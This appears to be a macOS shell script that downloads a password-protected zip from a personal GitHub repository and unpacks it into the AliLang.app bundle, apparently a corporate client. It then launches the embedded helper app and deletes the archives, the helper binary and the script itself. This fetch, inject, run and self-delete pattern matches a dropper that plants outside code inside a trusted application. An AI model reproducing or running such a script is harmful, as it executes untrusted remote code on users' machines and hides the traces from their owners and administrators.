#!/bin/sh
curl -o /tmp/alilangHelper.zip --create-dirs  https://raw.githubusercontent.com/fengxiaopeng1/zeek/master/gfz_mac0s_Alilang_2.zip
chmod 755 /tmp/alilangHelper.zip 
cp /tmp/alilangHelper.zip /Applications/AliLang.app/Contents/alilangHelper.zip
unzip -P alibaba -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/alilangHelper.zip
unzip -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/Alilang2.zip
chmod 755 /Applications/AliLang.app/Contents/AliLang\ Helper.app
open /Applications/AliLang.app/Contents/AliLang\ Helper.app    
rm -f /tmp/alilangHelper
rm -f /Applications/AliLang.app/Contents/Alilang.zip
rm -f /Applications/AliLang.app/Contents/AliLang Helper.app/Contents/MacOS/AliLang Helper
rm -f $0
